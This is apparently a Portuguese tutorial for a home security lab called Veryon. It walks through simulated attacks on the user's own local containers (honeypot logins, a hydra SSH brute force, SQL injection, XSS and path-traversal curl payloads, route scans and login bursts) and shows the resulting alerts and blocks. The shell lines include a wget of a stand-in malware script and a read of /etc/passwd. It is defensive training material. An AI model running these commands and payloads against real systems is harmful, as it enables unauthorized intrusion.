# Guia de ataques simulados

Este guia mostra como atacar o Veryon e ver cada ataque atravessar o sistema até
virar alerta e resposta no painel. Tudo roda contra o seu próprio laboratório, na
sua máquina, em containers isolados. Nada aqui toca máquina de terceiro.

Antes de começar, tenha o Veryon no ar (`docker compose up -d --build`) e o painel
aberto em `http://localhost:5173`. Deixe a tela de **Alertas** aberta num canto: é
onde quase tudo aparece.

Os endereços que os ataques usam:

| Alvo | Onde | O que é |
|---|---|---|
| Honeypot SSH | `localhost:2222` | Cowrie, aceita qualquer senha |
| Honeypot Telnet | `localhost:2223` | Cowrie |
| Juice Shop | `localhost:3000` | App web vulnerável de propósito |
| API do Veryon | `localhost:8000` | A própria API, que se observa |

---

## Aviso sobre senha no honeypot

O Cowrie grava em texto claro tudo que você digita numa sessão, **senha inclusive**.
Se você logar no honeypot digitando uma senha que usa de verdade em outro lugar, ela
fica gravada no log do container. Use sempre senha descartável nos testes.

---

## 1. Login no honeypot SSH

O ataque mais simples e o melhor pra confirmar que o pipeline inteiro funciona.

**Terminal:** qualquer um com cliente SSH (o próprio PowerShell do Windows já tem).

```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@localhost
```

Quando pedir senha, digite qualquer coisa (`123456`, `senha`, o que for). O honeypot
aceita e te joga num shell falso. Digite alguns comandos pra deixar rastro:

```bash
whoami
```

```bash
cat /etc/passwd
```

```bash
wget http://exemplo/malware.sh
```

Saia com `exit`.

**O que esperar no painel:** em poucos segundos, na tela de **Alertas**, aparece um
alerta **high** com título "Login bem-sucedido no honeypot", técnica MITRE **T1110**
(força bruta). Os comandos que você digitou viram eventos separados na tela de
**Eventos**, com `source` igual a `cowrie`.

---

## 2. Força bruta de SSH

Simula um atacante testando senha atrás de senha. Precisa do `hydra`, que já vem em
distros de pentest como Kali, ou instala com `apt install hydra`.

**Terminal:** Linux ou WSL.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://localhost:2222
```

Se não tiver o `hydra`, um laço no shell faz o mesmo efeito de rajada:

```bash
for i in $(seq 1 15); do
  ssh -p 2222 -o StrictHostKeyChecking=no -o PreferredAuthentications=password \
      root@localhost "exit" 2>/dev/null
done
```

**O que esperar no painel:** vários eventos de tentativa de login na tela de
**Eventos**, e o alerta de força bruta na tela de **Alertas**. Na tela de
**Prevenção**, a política **SSH-BRUTE** reconhece o caso (o contador de casos sobe).
Como ela nasce em modo observação, ela registra o que faria sem bloquear.

---

## 3. Bloquear o atacante, e ver o bloqueio valer

Depois que o alerta aparece, você tem o IP de origem. Vá tratar.

1. Na tela de **Alertas**, clique no alerta de honeypot pra abrir o detalhe.
2. Clique em **Bloquear**. O IP entra na blocklist.

**Como confirmar que bloqueou de verdade**, e não só na tela: o bloqueio age em dois
lugares. Tente logar de novo no honeypot com o mesmo IP:

```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@localhost
```

A conexão é recusada, porque o `iptables` dentro do namespace do Cowrie derruba o
pacote. E qualquer requisição na API a partir daquele IP também leva 403, porque o
middleware ASGI recusa antes de chegar na rota.

Pra desbloquear, use a tela de **Prevenção**, aba **Trilha de ações**, botão
**Desfazer**. O bloqueio sai na hora.

---

## 4. Varredura de vulnerabilidade

O Veryon tem um scanner (Nmap e Nuclei) que varre os serviços internos e o Juice
Shop. Você dispara pela tela, sem terminal nenhum.

1. Vá na tela de **Vulnerabilidades**.
2. Clique em **Rodar varredura agora**.

O botão trava enquanto a varredura roda (leva alguns minutos, a primeira vez baixa os
templates do Nuclei). Quando termina, a lista enche de achados reais do seu próprio
ambiente: portas abertas, serviços expostos, cabeçalhos faltando.

**O que observar:**

- Cada achado tem severidade, CVSS e a evidência que o scanner devolveu.
- O **score de risco do parque** no topo pondera tudo que está em aberto.
- Marque um achado como **Corrigida** e rode a varredura de novo. Se a condição ainda
  existir, ela **reabre sozinha** e o contador de reaberturas sobe. É o sistema
  dizendo que fecharam o chamado sem consertar.
- Tente marcar como **Risco aceito** sem preencher justificativa. A API recusa: risco
  aceito exige justificativa escrita e data de revisão.

---

## 5. Injeção contra a API

Aqui o alvo é a própria API do Veryon, que observa o próprio tráfego. Você manda
requisição com padrão de ataque na query e o motor de análise pontua.

**Terminal:** qualquer um com `curl`.

SQL injection na query:

```bash
curl "http://localhost:8000/events?source=%27%20OR%201%3D1--"
```

Cross-site scripting:

```bash
curl "http://localhost:8000/alerts?status=%3Cscript%3Ealert(1)%3C/script%3E"
```

Path traversal:

```bash
curl "http://localhost:8000/vulnerabilities?asset_type=../../../../etc/passwd"
```

Repare que os payloads vão percent-encoded (`%27` é a aspa, `%20` o espaço). É assim
que um atacante de verdade manda, e o motor decodifica antes de casar o padrão.

**O que esperar:** em até 10 segundos, na tela de **Análise de API**, aparece um
achado pro seu IP com o sinal **Tentativa de injeção** (peso 40) e a lista exata dos
padrões detectados. Clique no achado pra ver as requisições que o geraram.

---

## 6. Varredura de rotas e rajada de login

Dois sinais que aparecem juntos num ataque de reconhecimento.

Varredura de rotas (muitos caminhos que não existem, quase todos 404):

```bash
for i in $(seq 1 25); do
  curl -s -o /dev/null "http://localhost:8000/admin/painel-secreto-$i"
done
```

Rajada de falha de autenticação:

```bash
for i in $(seq 1 15); do
  curl -s -o /dev/null -X POST "http://localhost:8000/auth/login" \
       -d "username=admin&password=errada$i&website="
done
```

**O que esperar:** o achado de API pro seu IP soma os sinais **Varredura de rotas**
(peso 25) e **Rajada de falha de autenticação** (peso 30). Quando a soma passa de 70,
um alerta automático nasce na tela de **Alertas**. Passando de 90, o caso fica
disponível pra prevenção tratar, e aparece na **fila crítica**.

---

## 7. Analisar API de fora (ingestão de log)

Esta é a função que transforma o Veryon de "observa a si mesmo" em "observa a API de
um cliente". Um gateway externo manda o log de acesso em lote, e o mesmo motor de
sinais roda em cima.

Precisa da chave `INGEST_API_KEY` que você definiu no `.env`. Sem chave configurada,
o endpoint recusa tudo (é de propósito).

O exemplo abaixo simula um atacante fazendo varredura sequencial de objetos, puxando
`/customers/1`, `/customers/2`, e assim por diante, o clássico IDOR/BOLA. Troque
`SUA_CHAVE_AQUI` pela sua chave.

```bash
curl -X POST "http://localhost:8000/ingest/api-logs" \
  -H "X-Veryon-Key: SUA_CHAVE_AQUI" \
  -H "Content-Type: application/json" \
  -d '{
    "requests": [
      {"method":"GET","path":"/api/v1/customers/1","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/2","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/3","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/4","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/5","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/6","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/7","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/8","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200}
    ]
  }'
```

A resposta é `{"aceitas":8,"descartadas":0}`. Se você mandar a chave errada, leva
`401`.

**O que esperar:** o IP `203.0.113.77` aparece na **Análise de API** com o sinal
**Acesso sequencial a objetos**. Como `/api/v1/customers/{id}` não está no inventário
declarado da aplicação, ele também soma **API fantasma respondendo**. Dois sinais que
só a ingestão externa produz, porque dependem de rotas que não são do próprio Veryon.

---

## 8. Ligar uma política e ver a prevenção agir

Depois de gerar tráfego de ataque, vá na tela de **Prevenção**, aba **Políticas**.

1. Escolha a política **API-INJ** (Tentativa de injeção).
2. Clique em **Simular**. Ela mostra os alvos de agora e diz quais **seriam
   segurados** pelos trilhos de segurança, sem fazer nada ainda.
3. Se um IP público aparecer como "seria bloqueado", clique em **Observando** pra
   mudar pra **Em vigor**.

Em segundos, a política aplica o bloqueio de verdade. Vá na aba **Trilha de ações** e
veja a linha `applied`, com o alvo e o motivo. IPs internos ou reservados aparecem
como `held`, com o trilho que os segurou.

Clique em **Desfazer**. O bloqueio sai, e a política respeita a decisão: ela não
rebloqueia o mesmo alvo por uma hora.

Quando terminar de testar, volte a política pra **Observando**. É o estado de fábrica
seguro: nenhuma política bloqueia nada sozinha até você mandar.

---

## 9. Ver o mapa de origem

Depois de gerar tráfego de vários IPs (os exemplos acima usam faixas de documentação
como `203.0.113.x`, que são reservadas), vá no **Dashboard**.

No gráfico de colunas, clique no filtro **Origem dos IPs**. O cartão gira e revela o
mapa-múndi. IP público identificado vira ponto no país de origem; tráfego de rede
interna e IP não identificado são contados à parte, porque um não tem país pra
descobrir e o outro ainda não foi enriquecido.

---

## Resumo: um ataque completo do começo ao fim

Pra uma demonstração de ponta a ponta, nesta ordem:

1. Login no honeypot SSH (seção 1). Alerta nasce.
2. Injeção e varredura contra a API (seções 5 e 6). Achado de API sobe de score.
3. Alerta automático nasce quando o score passa de 70.
4. O caso entra na fila crítica da tela de Prevenção.
5. Você bloqueia, confirma que o bloqueio vale nos dois atuadores, e desfaz.
6. O mapa mostra de onde veio.

Cada passo deixa rastro visível no painel. É o pipeline inteiro de um SOC, do
primeiro pacote até a resposta, rodando na sua máquina.
